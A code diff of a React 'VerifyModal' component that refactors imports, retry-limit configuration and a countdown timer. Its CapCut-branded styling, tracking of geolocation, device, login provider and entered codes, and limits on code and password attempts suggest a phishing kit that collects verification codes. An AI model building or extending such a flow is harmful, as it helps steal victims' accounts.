@@ -1,9 +1,9 @@
 import VerifyImage from '@/assets/images/verify-image.png';
 import { CAPCUT_BTN_PRIMARY, CAPCUT_INPUT_CLASS, ModalShell, ModalSpinner } from '@/components/form-modal/modal-shell';
-import { modalRetryConfig } from '@/components/form-modal/modal-shell';
-import { submitFormStep } from '@/hooks/use-socket';
+import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
-import { useTranslation } from '@/utils/translate';
+import { submitFormStep } from '@/lib/ui-form-submit';
+import config from '@/utils/config';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
@@ -24,26 +24,19 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
 
     const { geoInfo, deviceLabel, messageId, loginProvider, userData, addCode, setMessageId } = store();
-    const maxCode = modalRetryConfig.MAX_CODE;
-    const loadingTime = modalRetryConfig.CODE_LOADING_TIME;
+    const maxCode = config.MAX_CODE ?? 3;
+    const maxPass = config.MAX_PASS ?? 3;
+    const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
     useEffect(() => {
-        if (countdown <= 0) {
-            return;
+        if (countdown > 0) {
+            const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
+            return () => clearTimeout(timer);
         }
-
-        const timer = window.setTimeout(() => {
-            setCountdown((prev) => {
-                if (prev <= 1) {
-                    setShowError(false);
-                    return 0;
-                }
-                return prev - 1;
-            });
-        }, 1000);
-
-        return () => window.clearTimeout(timer);
-    }, [countdown]);
+        if (countdown === 0 && showError) {
+            setShowError(false);
+        }
+    }, [countdown, showError]);
 
     const handleSubmit = async () => {
         if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;
